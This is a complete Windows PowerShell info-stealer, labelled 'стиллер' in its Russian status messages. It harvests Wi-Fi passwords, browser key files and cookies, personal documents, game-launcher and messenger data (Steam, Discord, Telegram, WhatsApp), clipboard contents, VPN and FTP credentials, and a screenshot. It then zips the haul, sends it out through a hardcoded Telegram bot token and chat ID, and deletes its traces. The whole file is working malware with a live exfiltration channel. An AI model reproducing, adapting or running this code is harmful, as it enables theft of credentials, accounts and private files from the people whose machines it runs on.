$messages = @{
    Start = "Запуск стиллера...";
    SystemCollect = "Сбор информации о системе";
    BrowsersCollect = "Сбор данных браузеров...";
    FilesCollect = "Сбор файлов...";
    GamingCollect = "Сбор данных игровых клиентов...";
    MessengersCollect = "Сбор логов мессенджеров...";
    Screenshot = "Делаем снимок экрана...";
    UserActivity = "Сбор клипборда и специфической активности...";
    NetworkCollect = "VPN/FTP данные...";
    Archive = "Архивируем данные...";
    TelegramSend = "Отправка архива в Telegram...";
    Success = "Архив успешно отправлен.";
    FailSend = "Не получилось отправить архив.";
    Finished = "Стиллер завершён.";
}

$BotToken = "8432230669:AAGsKeVpDl9nKqUuHUfciRxrGYdIGQ01b6I"
$ChatID = "1266539824"

Add-Type -Assembly System.IO.Compression.FileSystem

function WriteMsg($key) {
    if ($messages.ContainsKey($key)) {
        Write-Host $messages[$key]
    }
}

function Split-File {
    param([string]$FilePath, [int]$PartSizeMB = 49)
    $bufSize = 1MB
    $maxBytes = $PartSizeMB * 1MB
    $filename = [System.IO.Path]::GetFileNameWithoutExtension($FilePath)
    $ext = [System.IO.Path]::GetExtension($FilePath)
    $dir = [System.IO.Path]::GetDirectoryName($FilePath)
    $parts = @()
    
    $f = [System.IO.File]::OpenRead($FilePath)
    try {
        $partIdx = 1
        while ($f.Position -lt $f.Length) {
            $partName = "$dir\$filename.part$partIdx$ext"
            $out = [System.IO.File]::Create($partName)
            $written = 0
            $buf = New-Object byte[] $bufSize
            
            while ($written -lt $maxBytes -and $f.Position -lt $f.Length) {
                $toRead = [Math]::Min($bufSize, $maxBytes - $written)
                $r = $f.Read($buf, 0, $toRead)
                if ($r -gt 0) { 
                    $out.Write($buf, 0, $r)
                    $written += $r 
                } else { 
                    break 
                }
            }
            $out.Close()
            $parts += $partName
            $partIdx++
        }
    } finally { 
        $f.Close() 
    }
    return $parts
}

function Send-ResultToTelegram {
    param (
        [string]$BotToken,
        [string]$ChatID,
        [string]$ZipPath,
        [string]$Caption
    )
    
    $url = "https://api.telegram.org/bot$BotToken/sendDocument"
    try {
        Add-Type -AssemblyName System.Net.Http
        $fileStream = [System.IO.File]::OpenRead($ZipPath)
        $fileName = [System.IO.Path]::GetFileName($ZipPath)
        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
        
        $form = New-Object System.Net.Http.MultipartFormDataContent
        $form.Add($fileContent, "document", $fileName)
        $form.Add((New-Object System.Net.Http.StringContent($ChatID)), "chat_id")
        if ($Caption) {
            $form.Add((New-Object System.Net.Http.StringContent($Caption)), "caption")
        }
        
        $client = New-Object System.Net.Http.HttpClient
        $response = $client.PostAsync($url, $form).Result
        $statusCode = $response.StatusCode
        $response.Content.ReadAsStringAsync().Result | Out-Null
        
        $fileStream.Dispose()
        $form.Dispose()
        $client.Dispose()
        
        if ($statusCode -eq [System.Net.HttpStatusCode]::OK) {
            return $true
        } else {
            return $false
        }
    } catch {
        return $false
    }
}

function Get-SystemInfo {
    param([string]$OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    
    $ipConfig = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Select-Object -ExpandProperty IPAddress
    $externalIp = try { 
        (Invoke-RestMethod -Uri 'https://api.ipify.org' -TimeoutSec 5 -ErrorAction Stop).Trim() 
    } catch { 
        "N/A" 
    }
    
    $localIPStr = ($ipConfig -join ", ")
    $userInfo = @"
Username: $($env:USERNAME)
ComputerName: $($env:COMPUTERNAME)
Local IP: $localIPStr
External IP: $externalIp
"@
    $userInfo | Out-File "$OutDirectory\user_info.txt" -Force -Encoding UTF8
    
    try {
        $osInfo = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
        $cpuInfo = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue
        $sysInfo = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
        
        $sysInfoStr = @"
OS: $($osInfo.Caption)
Version: $($osInfo.Version)
Architecture: $env:PROCESSOR_ARCHITECTURE
RAM: $([Math]::Round($sysInfo.TotalPhysicalMemory / 1GB, 2)) GB
CPU: $($cpuInfo.Name)
"@
        $sysInfoStr | Out-File "$OutDirectory\computer_info.txt" -Force -Encoding UTF8
    } catch {}
    
    try {
        Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* -ErrorAction SilentlyContinue |
            Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
            Format-Table -AutoSize |
            Out-File "$OutDirectory\installed_programs.txt" -Force -Encoding UTF8
    } catch {}
    
    try {
        $wifiProfiles = (netsh wlan show profiles 2>$null) | Select-String ":(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
        $wifiData = @()
        foreach ($profile in $wifiProfiles) {
            try {
                $profileData = (netsh wlan show profile name="$profile" key=clear 2>$null)
                $password = $profileData | Select-String "Key Content\W+:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
                if ($password) { 
                    $wifiData += [PSCustomObject]@{SSID=$profile; Password=$password} 
                }
            } catch {}
        }
        if ($wifiData.Count -gt 0) {
            $wifiData | Format-Table -AutoSize | Out-File "$OutDirectory\wifi_passwords.txt" -Force -Encoding UTF8
        }
    } catch {}
}

function Get-BrowserData {
    param([string]$OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    
    $chromiumDir = "$OutDirectory\Chromium"
    $firefoxDir = "$OutDirectory\Firefox"
    New-Item -Path $chromiumDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    New-Item -Path $firefoxDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    
    $browsers = @(
        @{Path="$env:LOCALAPPDATA\Google\Chrome\User Data"; Name="Chrome"},
        @{Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data"; Name="Edge"},
        @{Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"; Name="Brave"},
        @{Path="$env:LOCALAPPDATA\Opera\Opera Stable"; Name="Opera"}
    )
    
    foreach ($browser in $browsers) {
        if (Test-Path $browser.Path) {
            $browserOutDir = "$chromiumDir\$($browser.Name)"
            New-Item -Path $browserOutDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
            try {
                $localStatePath = "$($browser.Path)\Local State"
                if (Test-Path $localStatePath) {
                    Copy-Item $localStatePath -Destination "$browserOutDir\" -Force -ErrorAction SilentlyContinue
                }
            } catch {}
        }
    }
    
    $profilesIni = "$env:APPDATA\Mozilla\Firefox\profiles.ini"
    if (Test-Path $profilesIni) {
        try {
            $profiles = Get-Content $profilesIni -ErrorAction SilentlyContinue | Select-String "Path=" | ForEach-Object { $_.Line -replace ".*Path=", "" }
            foreach ($profile in $profiles) {
                $profilePath = "$env:APPDATA\Mozilla\Firefox\$profile"
                if (Test-Path $profilePath) {
                    $profileOutDir = "$firefoxDir\$profile"
                    New-Item -Path $profileOutDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
                    try {
                        $cookiePath = "$profilePath\cookies.sqlite"
                        if (Test-Path $cookiePath) {
                            Copy-Item $cookiePath -Destination "$profileOutDir\" -Force -ErrorAction SilentlyContinue
                        }
                    } catch {}
                }
            }
        } catch {}
    }
}

function Gather-Files {
    param([string]$OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    
    $userDirs = @(
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Downloads"
    )
    
    foreach ($dir in $userDirs) {
        if (Test-Path $dir) {
            try {
                Get-ChildItem -Path $dir -File -Recurse -ErrorAction SilentlyContinue |
                    Where-Object {
                        $_.Length -lt 20MB -and
                        $_.Attributes -notmatch "System" -and
                        $_.Name -notmatch "(?:pagefile|swapfile|\.tmp$|\.log$)" -and
                        $_.FullName -notmatch "\\Cache\\|\\Code Cache\\|\\GPUCache\\|\\Service Worker\\|\\Local Storage\\|\\Session Storage\\"
                    } | ForEach-Object {
                    try {
                        Copy-Item $_.FullName -Destination "$OutDirectory\" -Force -ErrorAction SilentlyContinue
                    } catch {}
                }
            } catch {}
        }
    }
}

function Get-GameLauncherData {
    param([string]$OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    
    $gamePaths = @(
        "$env:APPDATA\Steam",
        "$env:LOCALAPPDATA\Epic Games",
        "$env:APPDATA\GOG.com",
        "$env:LOCALAPPDATA\DayZ"
    )
    
    foreach ($gamePath in $gamePaths) {
        if (Test-Path $gamePath) {
            $gameName = Split-Path $gamePath -Leaf
            try {
                Copy-Item $gamePath -Destination "$OutDirectory\$gameName" -Recurse -Force -ErrorAction SilentlyContinue
            } catch {}
        }
    }
}

function Get-MessengerData {
    param([string]$OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    
    $messengerPaths = @(
        "$env:APPDATA\Discord",
        "$env:LOCALAPPDATA\Telegram Desktop",
        "$env:APPDATA\Skype",
        "$env:APPDATA\WhatsApp",
        "$env:LOCALAPPDATA\Viber"
    )
    
    foreach ($messengerPath in $messengerPaths) {
        if (Test-Path $messengerPath) {
            $messengerName = Split-Path $messengerPath -Leaf
            try {
                Copy-Item $messengerPath -Destination "$OutDirectory\$messengerName" -Recurse -Force -ErrorAction SilentlyContinue
            } catch {}
        }
    }
}

function Take-Screenshot {
    param([string]$OutFile)
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
        $bitmap.Save($OutFile)
        $graphics.Dispose()
        $bitmap.Dispose()
    } catch {}
}

function Get-UserActivity {
    param([string]$OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    
    try {
        $clipboard = Get-Clipboard -ErrorAction SilentlyContinue
        if ($clipboard) {
            $clipboard | Out-File "$OutDirectory\clipboard.txt" -Force -Encoding UTF8
        }
    } catch {}
    
    try {
        Get-EventLog -LogName Security -Newest 1000 -ErrorAction SilentlyContinue |
            Export-Csv "$OutDirectory\security_events.csv" -Force -Encoding UTF8
    } catch {}
}

function Get-VpnFtpData {
    param([string]$OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    
    $vpnDir = "$OutDirectory\VPN_Configs"
    New-Item -Path $vpnDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    
    $searchDirs = @(
        "$env:USERPROFILE\Downloads",
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Desktop",
        "$env:APPDATA\OpenVPN",
        "$env:APPDATA\OpenVPN Connect",
        "$env:APPDATA\ProtonVPN"
    )
    
    foreach ($dir in $searchDirs) {
        if (Test-Path $dir) {
            try {
                Get-ChildItem -Path $dir -File -Recurse -Include *.ovpn, *.conf, *.ini -ErrorAction SilentlyContinue |
                    Where-Object { $_.Length -le 5MB } |
                    ForEach-Object {
                        try {
                            Copy-Item $_.FullName -Destination $vpnDir -Force -ErrorAction SilentlyContinue
                        } catch {}
                    }
            } catch {}
        }
    }
    
    $ftpDir = "$OutDirectory\FTP_Clients"
    New-Item -Path $ftpDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    
    $ftpPaths = @(
        "$env:APPDATA\FileZilla",
        "$env:APPDATA\WinSCP.ini",
        "$env:APPDATA\CoreFTP",
        "$env:APPDATA\Cyberduck",
        "$env:APPDATA\SmartFTP"
    )
    
    foreach ($ftpPath in $ftpPaths) {
        if (Test-Path $ftpPath) {
            try {
                Copy-Item $ftpPath -Destination $ftpDir -Recurse -Force -ErrorAction SilentlyContinue
            } catch {}
        }
    }
}

function Start-Execution {
    WriteMsg "Start"
    $tempDir = "$env:TEMP\SystemData-$(Get-Random)"
    New-Item -Path $tempDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null

    WriteMsg "SystemCollect"
    Get-SystemInfo -OutDirectory "$tempDir\System"
    
    WriteMsg "BrowsersCollect"
    Get-BrowserData -OutDirectory "$tempDir\Browsers"
    
    WriteMsg "FilesCollect"
    Gather-Files -OutDirectory "$tempDir\Files"
    
    WriteMsg "GamingCollect"
    Get-GameLauncherData -OutDirectory "$tempDir\Gaming"
    
    WriteMsg "MessengersCollect"
    Get-MessengerData -OutDirectory "$tempDir\Messengers"
    
    WriteMsg "UserActivity"
    Get-UserActivity -OutDirectory "$tempDir\Activity"
    
    WriteMsg "NetworkCollect"
    Get-VpnFtpData -OutDirectory "$tempDir\Network"

    WriteMsg "Screenshot"
    Take-Screenshot -OutFile "$tempDir\screenshot.png"

    WriteMsg "Archive"
    $zipPath = "$env:TEMP\DataPackage-$(Get-Random).zip"
    if (Test-Path $zipPath) { 
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue 
    }
    
    try {
        [System.IO.Compression.ZipFile]::CreateFromDirectory(
            $tempDir,
            $zipPath,
            [System.IO.Compression.CompressionLevel]::Fastest,
            $false
        )
    } catch {
        Write-Host "Archive error: $_"
        Remove-Item -Path $tempDir -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
        return
    }

    $zipSizeMB = [Math]::Round((Get-Item $zipPath -ErrorAction SilentlyContinue).Length / 1MB, 2)
    
    WriteMsg "TelegramSend"
    
    $systemInfoPath = "$tempDir\System\user_info.txt"
    $caption = ""
    
    if (Test-Path $systemInfoPath) {
        try {
            $caption = Get-Content $systemInfoPath -Raw -ErrorAction Stop
        } catch {
            $caption = "System info file exists but cannot be read"
        }
    } else {
        $caption = "System info not available"
    }
    
    $maxTelegramMB = 49
    
    if ($zipSizeMB -le $maxTelegramMB) {
        $ok = Send-ResultToTelegram $BotToken $ChatID $zipPath $caption
        if ($ok) { 
            WriteMsg "Success" 
        } else { 
            WriteMsg "FailSend" 
        }
    } else {
        $parts = Split-File -FilePath $zipPath -PartSizeMB $maxTelegramMB
        $allOk = $true
        foreach ($pt in $parts) {
            $ok = Send-ResultToTelegram $BotToken $ChatID $pt $caption
            if (-not $ok) { 
                $allOk = $false 
            }
        }
        if ($allOk) { 
            WriteMsg "Success" 
        } else { 
            WriteMsg "FailSend" 
        }
        
        foreach ($pt in $parts) {
            Remove-Item -Path $pt -Force -ErrorAction SilentlyContinue
        }
    }
    
    Remove-Item -Path $tempDir -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
    Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
    
    WriteMsg "Finished"
}

Start-Execution
